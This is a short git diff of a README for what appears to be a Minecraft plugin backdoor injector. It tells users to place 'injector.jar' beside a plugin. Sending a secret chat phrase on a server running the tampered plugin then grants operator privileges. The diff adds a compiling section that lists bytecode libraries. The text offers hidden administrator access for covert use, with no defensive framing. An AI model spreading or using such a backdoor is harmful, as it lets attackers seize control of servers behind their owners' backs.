@@ -8,3 +8,8 @@ Download the `injector.jar` in the releases tab and put it in the same folder as
 
 ## Usage
 Once the plugin is used on a server, send in chat the message `~ectasy~` and you will automatically gain op privileges.
+
+## Compiling
+You will need the following librairies: <br>
+- https://commons.apache.org/proper/commons-io/
+- https://asm.ow2.io/
